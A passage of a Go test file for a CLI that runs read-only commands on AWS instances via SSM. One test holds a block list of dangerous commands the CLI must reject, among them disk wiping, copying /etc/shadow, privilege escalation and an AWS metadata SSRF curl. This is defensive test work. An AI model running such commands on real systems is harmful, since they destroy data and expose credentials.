	output, err := runLilyAWS(t, lilyBin, proxy.URL,
		"ssm", "start-session",
		"--target", "i-cli-test",
		"--command", "systemctl status nginx",
	)
	if err != nil {
		t.Fatalf("lily aws failed: %v\noutput: %s", err, output)
	}

	if !strings.Contains(output, "nginx is running") {
		t.Errorf("output = %q, expected 'nginx is running'", output)
	}
}

// testSSMCLIRunFailed tests the full CLI path with a command that fails on the
// remote instance. Verifies that stderr and exit code are correctly channeled.
func testSSMCLIRunFailed(t *testing.T) {
	proxy := newSSMProxy(t)
	defer proxy.Close()

	proxy.SetResponseFn(func(command string) ssmCommandResult {
		return ssmCommandResult{
			status:   "Failed",
			stdout:   "",
			stderr:   "cat: /etc/nonexistent: No such file or directory\n",
			exitCode: 1,
		}
	})

	lilyBin := buildLily(t)

	output, _ := runLilyAWS(t, lilyBin, proxy.URL,
		"ssm", "start-session",
		"--target", "i-cli-test",
		"--command", "cat /etc/nonexistent",
	)

	if !strings.Contains(output, "No such file or directory") {
		t.Errorf("output = %q, expected error message", output)
	}
}

// testSSMCLIBlocked tests that the lily CLI blocks dangerous commands
// before they ever reach the SSM API.
func testSSMCLIBlocked(t *testing.T) {
	proxy := newSSMProxy(t)
	defer proxy.Close()

	lilyBin := buildLily(t)

	// These commands must be blocked by the lily CLI before they ever reach
	// the SSM proxy. We test one representative per category.
	blocked := []struct {
		cmd    string
		reason string
	}{
		// ── Destructive ──
		{"rm -rf /", "destructive delete"},
		{"mv /etc/hosts /tmp/", "file move"},
		{"cp /etc/shadow /tmp/", "file copy"},
		{"dd if=/dev/zero of=/dev/sda", "disk destruction"},

		// ── Privilege escalation ──
		{"sudo whoami", "sudo"},
		{"su - root", "su"},

		// ── Shells ──
		{"bash -c 'echo pwned'", "bash shell"},
		{"python3 -c 'import os'", "python interpreter"},

		// ── Editors ──
		{"vi /etc/hosts", "vi editor"},
		{"nano /etc/hosts", "nano editor"},

		// ── File transfer ──
		{"scp file user@host:/tmp", "scp transfer"},
		{"rsync -av /src /dst", "rsync transfer"},

		// ── Package mutation ──
		{"apt install nginx", "apt install"},
		{"pip install requests", "pip install"},

		// ── systemctl mutation ──
		{"systemctl restart nginx", "systemctl restart"},

		// ── curl mutation ──
		{"curl -X POST http://localhost", "curl POST"},

		// ── Output redirection ──
		{"echo test > /tmp/out.txt", "output redirect"},

		// ── Command substitution / metacharacters ──
		{"echo $(whoami)", "command substitution"},
		{"echo `whoami`", "backtick substitution"},
		{"echo ${PATH}", "parameter expansion"},
		{"echo $HOME", "variable expansion"},

		// ── sed in-place ──
		{"sed -i 's/foo/bar/' file", "sed in-place edit"},

		// ── Environment leaking ──
		{"env", "env leaks variables"},

		// ── SSRF ──
		{"curl http://169.254.169.254/latest/meta-data/", "AWS metadata SSRF"},

		// ── System power ──
		{"reboot", "reboot"},
	}

	for _, tc := range blocked {
		t.Run(tc.cmd, func(t *testing.T) {
			output, err := runLilyAWS(t, lilyBin, proxy.URL,
				"ssm", "start-session",
				"--target", "i-cli-test",
				"--command", tc.cmd,
			)
			if err == nil {
				t.Errorf("expected %q to be blocked (%s), but got no error. output: %s", tc.cmd, tc.reason, output)
			}
			if !strings.Contains(output, "blocked") && !strings.Contains(output, "not allowed") {
				t.Errorf("expected 'blocked' or 'not allowed' in output for %q (%s), got: %s", tc.cmd, tc.reason, output)
			}
		})
	}
}

// testSSMCLIInvalidSubcommand tests that the CLI rejects invalid subcommands.
func testSSMCLIInvalidSubcommand(t *testing.T) {
	lilyBin := buildLily(t)

	invalid := []struct {
		name string
		args []string
	}{
		{"s3 ls", []string{"s3", "ls"}},
		{"ssm describe", []string{"ssm", "describe-instance-information"}},
		{"no target", []string{"ssm", "start-session", "--command", "echo hi"}},
	}

	for _, tt := range invalid {
		t.Run(tt.name, func(t *testing.T) {
			args := []string{"--endpoint-url", "http://localhost:1"}
			args = append(args, tt.args...)
			output, err := runLilyAWS(t, lilyBin, "http://localhost:1", args...)
			if err == nil {
				t.Errorf("expected error for %v, got output: %s", tt.args, output)
			}
		})
	}
}

// testSSMCLIMultiple tests running multiple CLI commands in sequence with
// different outputs, verifying that each invocation correctly channels the
// right output without cross-contamination.
func testSSMCLIMultiple(t *testing.T) {
	proxy := newSSMProxy(t)
	defer proxy.Close()

	lilyBin := buildLily(t)

	tests := []struct {
		command  string
		stdout   string
		stderr   string
		exitCode int
	}{
		{"uname -a", "Linux ip-172-31-0-1 5.15.0 x86_64\n", "", 0},
		{"whoami", "ec2-user\n", "", 0},
		{"ps aux", "USER PID %CPU %MEM\nroot 1 0.0 sshd\n", "", 0},
		{"cat /nonexistent", "", "No such file\n", 1},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			proxy.SetResponseFn(func(command string) ssmCommandResult {
				return ssmCommandResult{
					status:   "Success",
					stdout:   tt.stdout,
					stderr:   tt.stderr,
					exitCode: tt.exitCode,
				}
			})

			output, _ := runLilyAWS(t, lilyBin, proxy.URL,
				"ssm", "start-session",
				"--target", "i-multi-test",
				"--command", tt.command,
			)

			if tt.stdout != "" && !strings.Contains(output, tt.stdout) {
				t.Errorf("output = %q, expected to contain %q", output, tt.stdout)
			}
			if tt.stderr != "" && !strings.Contains(output, tt.stderr) {
				t.Errorf("output = %q, expected to contain %q", output, tt.stderr)
			}
		})
	}
}

// ============================================================================
// Edge cases
// ============================================================================

// testEC2InstanceConnectBlocked verifies that EC2 Instance Connect is rejected.
func testEC2InstanceConnectBlocked(t *testing.T) {
	v := readonly.DefaultValidator()
	_, err := cloud.Run(context.Background(), cloud.AWS,
		[]string{"ec2-instance-connect", "ssh", "--instance-id", "i-xxx"},
		"whoami", v, 30*time.Second, 1024*1024,
	)
	if err == nil {
		t.Fatal("expected ec2-instance-connect to be rejected")
	}
	if !strings.Contains(err.Error(), "ec2-instance-connect") {
		t.Errorf("error should mention ec2-instance-connect: %v", err)
	}
}
